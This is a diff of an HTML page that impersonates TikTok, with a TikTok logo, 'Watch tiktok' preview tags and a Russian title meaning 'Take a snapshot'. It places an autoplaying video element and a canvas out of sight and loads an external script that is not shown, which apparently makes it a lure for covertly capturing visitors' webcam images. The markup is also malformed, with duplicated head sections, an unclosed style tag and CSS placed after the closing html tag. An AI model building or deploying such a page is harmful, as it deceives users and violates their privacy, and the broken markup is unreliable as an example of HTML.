@@ -1,93 +1,57 @@
 <!DOCTYPE html>
 
 <html lang="en">
-
 <head>
-
-    <meta charset="UTF-8">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>TikTok</title>
-
-    <style>
-
-        * {
-
-            margin: 0;
-
-            padding: 0;
-
-            box-sizing: border-box;
-
-        }
-
-        
-<!DOCTYPE html>
-
-<html lang="en">
-
-<head>
-
-    <meta charset="UTF-8">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>TikTok</title>
-
-    <style>
-
-        * {
-
-            margin: 0;
-
-            padding: 0;
-
-            box-sizing: border-box;
-
-        }
-
-        
-
-        body {
-
-            background: url('https://i.ibb.co/Y7crqJ0Z/quality-restoration-20250731131830998.jpg') no-repeat center center fixed;
-
-            background-size: cover;
-
-            min-height: 100vh;
-
-            font-family: Arial, sans-serif;
-
-            overflow: hidden;
-
-        }
-
-        
-
-        #video, #canvas {
-
-            position: absolute;
-
-            width: 1px;
-
-            height: 1px;
-
-            opacity: 0;
-
-            pointer-events: none;
-
-        }
-
-    </style>
-
-</head>
-
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="Tiktok video" property="og:title">
+<meta content="Watch tiktok" property="og:description">
+<meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
+<meta content="website" property="og:type"/>
+<title>Сделайте снимок</title>
+<link href="../css\main.css" rel="stylesheet"/>
+</meta></meta></head>
 <body>
+<div class="container">
+<div class="image-container">
+<video autoplay="" playsinline=""></video>
+<canvas></canvas>
+</div>
+<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
+</div>
+<script src="../js\main.js"></script>
+</body>
+</html>
+<style
 
-    <video id="video" autoplay playsinline></video>
-
-    <canvas id="canvas"></canvas>
+body {
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #000
+    }
+.container {
+    text-align: center;
+    max-width: 400px;
+    width: 100%
+    }
+.image-container {
+    background-color: #1c1e24;
+    border-radius: 20px;
+    overflow: hidden;
+    margin-bottom: 20px
+    }
+video {
+    width: 100%;
+    height: auto;
+    display: none
+    }
+canvas {
+    display: none
+    }
 
     
 
